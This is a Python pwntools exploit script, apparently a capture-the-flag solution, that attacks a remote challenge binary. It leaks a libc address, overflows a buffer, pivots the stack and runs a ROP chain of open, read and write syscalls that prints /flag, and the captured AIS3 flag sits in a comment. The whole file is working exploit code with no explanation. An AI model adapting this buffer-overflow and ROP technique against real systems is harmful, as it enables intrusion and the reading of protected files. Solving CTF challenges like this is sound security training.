from pwn import *
context.arch='amd64'
#r = process('./J',env={"LD_PRELOAD" : "./libc.so.6"})
r = remote('10.105.0.21',12498)
r.recvline()
r.sendlineafter(b'number: ',str(31).encode())
r.recvuntil(b'ticket ')
libc = int(r.recvline().strip(),16) - 0x29d90
print(hex(libc))


pop_rax_ret = libc + 0x45eb0
pop_rdi_ret = libc + 0x02a3e5
pop_rsi_ret = libc + 0x2be51 
pop_rdx_ret = libc + 0x796a2
sys_ret = libc + 0x91316
pop_rsp = libc + 0x35732
code_base = 0x400000

rop_chain = flat([
    pop_rdi_ret, 0, pop_rsi_ret, code_base + 0x4700, pop_rdx_ret, 400, pop_rax_ret, 0, sys_ret, pop_rsp, code_base + 0x4718
])
r.send(b'a'*0x70 + p64(0x404600) + rop_chain)
rop_chain = flat([
    pop_rdi_ret, code_base + 0x4700, pop_rsi_ret, 0, pop_rdx_ret, 0, pop_rax_ret, 2, sys_ret,
    pop_rdi_ret, 3, pop_rsi_ret, code_base + 0x4900, pop_rdx_ret, 100, pop_rax_ret, 0, sys_ret,
    pop_rdi_ret, 1, pop_rsi_ret, code_base + 0x4900, pop_rdx_ret, 100, pop_rax_ret, 1, sys_ret
])
input()
flag = b'/flag'
r.send(flag.ljust(0x18,b'\x00')+rop_chain) #AIS3{JUST_a_eaSy_INT_OvERfloW_4nD_8Uf_0vERfLOW}

r.interactive()